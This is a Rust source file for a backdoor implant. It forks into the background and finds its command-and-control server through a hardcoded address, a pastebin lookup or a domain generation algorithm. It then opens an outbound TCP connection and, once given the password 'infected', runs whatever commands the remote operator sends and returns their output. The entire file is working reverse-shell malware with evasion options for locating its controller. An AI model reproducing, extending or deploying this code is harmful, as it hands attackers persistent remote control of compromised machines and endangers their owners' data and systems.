use fork::{daemon, Fork};
use std::process::Command;
use std::path::Path;
use std::net::TcpStream;
use std::env;
use std::io::Write;
use std::io::Read;
use std::process::Stdio;
mod ipaddr;

fn main() {
    if let Ok(Fork::Child) = daemon(false, false) {
        let args: Vec<String> = env::args().collect();
        let ip: String;
        if args.len() == 1 {
            ip = ipaddr::hardcoded();
        } else {
            ip = match args[1].as_str() {
                "hardcoded" => ipaddr::hardcoded(),
                "pastebin" => ipaddr::pastebin(),
                "dga" => ipaddr::dga(),
                "dga_dict" => ipaddr::dga_dict(),
                _ => ipaddr::hardcoded()
            }
        }

        if let Ok(mut stream) = TcpStream::connect(ip) {
            stream.write(b"Password: ").unwrap();
            let mut buf = [0; 1024];
            let len = stream.read(&mut buf).unwrap();
            let password = String::from_utf8(buf[..len].to_vec())
                .unwrap()
                .trim()
                .to_string();

            if password == "infected" {
                // Adapted from https://www.joshmcguigan.com/blog/build-your-own-shell-rust/
                loop {
                    let mut buf = [0; 1024];
                    let len = stream.read(&mut buf).unwrap();
                    let input = String::from_utf8(buf[..len].to_vec())
                        .unwrap()
                        .trim()
                        .to_string();
            
                    let mut parts = input.trim().split_whitespace();
                    let command = parts.next().unwrap();
                    let args = parts;
            
                    match command {
                        "cd" => {
                            let new_dir = args.peekable().peek().map_or("/", |x| *x);
                            let root = Path::new(new_dir);
                            match env::set_current_dir(root) {
                                Ok(_) => {
                                    stream.write(b"ok").unwrap();
                                },
                                Err(e) => {
                                    stream.write(format!("{}", e).as_bytes()).unwrap();
                                }
                            }
                        },
                        "exit" => {
                            stream.write(b"EXIT").unwrap();
                            break;
                        },
                        command => {
                            let process = Command::new(command)
                                .args(args)
                                .stdout(Stdio::piped())
                                .stderr(Stdio::piped())
                                .spawn();
                            
                            match process {
                                Ok(process) => {
                                    match process.wait_with_output() {
                                        Ok(out) => {
                                            // convert stdout to string
                                            let stdout = String::from_utf8(out.stdout).unwrap_or_default();
                                            let stderr = String::from_utf8(out.stderr).unwrap_or_default();
                                            stream.write(format!("{} {}", stdout, stderr).as_bytes()).unwrap();
                                        },
                                        Err(e) => {
                                            stream.write(format!("{}", e).as_bytes()).unwrap();
                                        }
                                    }
                                },
                                Err(e) => {
                                    stream.write(format!("{}", e).as_bytes()).unwrap();
                                }
                            }
                        }
                    }
                }                
            }
        }
    }
}
